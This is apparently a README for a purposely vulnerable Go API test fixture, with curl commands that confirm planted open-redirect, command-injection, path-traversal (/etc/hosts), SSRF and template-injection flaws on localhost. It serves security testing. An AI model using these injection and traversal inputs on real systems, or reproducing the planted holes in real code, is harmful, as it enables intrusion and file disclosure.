# app-project-gobase local validation

This fixture was cloned from gobase commit
`7fde5c427e888264da52415d5381bb4464834f34`. The workspace endpoints were
added as realistic application support features on top of the original API
skeleton.

The source declares Go `1.18.1`; validation used the official Go `1.26.6`
linux/arm64 toolchain installed under `$HOME/.local/go` because no Go binary
was available in the container.

The service has no database or external service dependency. Install or expose
the project-compatible Go toolchain, then start the API from the project root:

```sh
cd fixtures/app-project-gobase/project
export PATH="$HOME/.local/go/bin:$PATH"
HTTP_SERVER_ADDR=127.0.0.1:8000 go run ./cmd/app serve
```

The API listens on `http://127.0.0.1:8000`. Run the checks below from another
terminal and stop the server with `Ctrl-C` afterward.

## Open redirect

```sh
curl -sS -o /dev/null -D - --get \
  --data-urlencode 'next=https://example.com/' \
  http://127.0.0.1:8000/api/v1/workspace/continue
```

Expected result: the response contains `Location: https://example.com/`.
Without `next`, the normal destination is `/api/v1/status`.

## Command injection

```sh
curl -fsS --get \
  --data-urlencode 'hostname=localhost"; id; #' \
  http://127.0.0.1:8000/api/v1/workspace/diagnostics/hostname
```

Expected result: the response contains a harmless `uid=...` line from `id`.

## Path traversal

First verify the normal report control:

```sh
curl -fsS --get \
  --data-urlencode 'name=technology-overview.txt' \
  http://127.0.0.1:8000/api/v1/workspace/reports/download
```

Expected result: the response contains `Technology overview`.

Then request `/etc/hosts` through the report path:

```sh
curl -fsS --get \
  --data-urlencode 'name=../../../../../../../../../etc/hosts' \
  http://127.0.0.1:8000/api/v1/workspace/reports/download
```

Expected result: the response contains a local hosts entry such as
`127.0.0.1 localhost` or `::1`.

## SSRF

In another terminal, start a loopback-only marker server:

```sh
mkdir -p /tmp/app-project-gobase-ssrf
printf 'LOCAL_LOGO_MARKER\n' > /tmp/app-project-gobase-ssrf/logo.txt
python3 -m http.server 9001 \
  --bind 127.0.0.1 \
  --directory /tmp/app-project-gobase-ssrf
```

Fetch the marker through the application:

```sh
curl -fsS --get \
  --data-urlencode 'logo_url=http://127.0.0.1:9001/logo.txt' \
  http://127.0.0.1:8000/api/v1/workspace/branding/preview
```

Expected result: the response contains `LOCAL_LOGO_MARKER`, proving that the
Go process made the request.

## Template injection

```sh
curl -fsS --get \
  --data-urlencode 'template={{printf "%s" "TEMPLATE_MARKER"}}' \
  http://127.0.0.1:8000/api/v1/workspace/templates/preview
```

Expected result: the response contains `TEMPLATE_MARKER`.

Remove the temporary SSRF directory and stop its Python process after the
check:

```sh
rm -rf -- /tmp/app-project-gobase-ssrf
```
